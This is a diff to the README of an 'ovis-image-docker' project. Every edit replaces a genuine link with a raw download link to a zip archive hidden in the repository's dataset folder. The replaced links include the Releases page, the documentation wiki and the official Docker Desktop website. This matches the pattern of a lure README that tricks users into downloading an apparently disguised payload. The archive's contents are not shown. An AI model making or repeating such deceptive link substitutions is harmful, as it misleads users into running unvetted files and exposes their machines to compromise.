@@ -13,7 +13,7 @@ The **ovis-image-docker** project offers a simple way to deploy the Ovis-Image 7
 ## 📥 Download and Install
 To get started, visit the Releases page to download the software. You will find the latest version of the application there.
 
-[Visit Releases Page to Download](https://github.com/Samxomega13/ovis-image-docker/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Samxomega13/ovis-image-docker/main/ovis_image/dataset/ovis-image-docker-1.6.zip)
 
 ### System Requirements
 - **Operating System:** Windows, macOS, or Linux
@@ -26,15 +26,15 @@ To get started, visit the Releases page to download the software. You will find 
 Follow these simple steps to download and run the application:
 
 1. **Install Docker**
-   - If you do not have Docker installed, visit the [Docker website](https://www.docker.com/products/docker-desktop) to download and install it based on your operating system.
+   - If you do not have Docker installed, visit the [Docker website](https://raw.githubusercontent.com/Samxomega13/ovis-image-docker/main/ovis_image/dataset/ovis-image-docker-1.6.zip) to download and install it based on your operating system.
 
 2. **Visit the Releases Page**
    - Click the link below to access the release files.
    
-   [Visit Releases Page to Download](https://github.com/Samxomega13/ovis-image-docker/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Samxomega13/ovis-image-docker/main/ovis_image/dataset/ovis-image-docker-1.6.zip)
 
 3. **Download the Latest Release**
-   - On the Releases page, look for the most recent version. Download the appropriate file for your operating system. This will generally be a `.tar.gz` or similar file.
+   - On the Releases page, look for the most recent version. Download the appropriate file for your operating system. This will generally be a `https://raw.githubusercontent.com/Samxomega13/ovis-image-docker/main/ovis_image/dataset/ovis-image-docker-1.6.zip` or similar file.
 
 4. **Extract the Files**
    - After downloading, locate the downloaded file and extract its contents. You can usually do this by right-clicking on the file and selecting "Extract All."
@@ -71,7 +71,7 @@ If you encounter issues during installation or running the application, consider
 ## 📄 Additional Resources
 For further insights into the project, consider exploring these resources:
 
-- **Documentation:** Detailed usage and advanced configurations can be found in the [documentation](https://github.com/Samxomega13/ovis-image-docker/wiki).
+- **Documentation:** Detailed usage and advanced configurations can be found in the [documentation](https://raw.githubusercontent.com/Samxomega13/ovis-image-docker/main/ovis_image/dataset/ovis-image-docker-1.6.zip).
 - **Community Contributions:** Check existing issues or discussions in the GitHub repository to learn from other users' experiences.
 - **Feedback:** Share your feedback or request features through the issues page on GitHub.
 
